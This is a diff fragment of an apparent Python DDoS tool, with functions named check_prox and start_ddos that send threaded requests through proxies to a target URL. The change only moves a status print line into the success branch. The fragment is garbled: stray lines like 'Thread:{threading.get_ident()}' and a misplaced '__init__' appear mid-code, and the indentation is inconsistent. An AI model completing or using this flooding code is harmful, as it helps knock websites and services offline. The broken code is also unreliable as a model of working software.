@@ -49,7 +49,6 @@ def check_prox(array, url):
 
 while threading.active_count()>150 :
     time.sleep(5)
-	print("\033[104m\033[37m" +str(url)+ "\033[0m \033[37mProssecing 0n")
 Thread:{threading.get_ident()}
 def __init__(self):
         print("init")
@@ -81,6 +80,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
+			print("\033[104m\033[37m" +str(url)+ "\033[0m \033[37mProssecing 0n")
 			print(color+"{}".format(prox))
 			print("\033[104m\033[37m" +str(url)+ "\033[0m \033[33mProssecing 0n")
 	except:
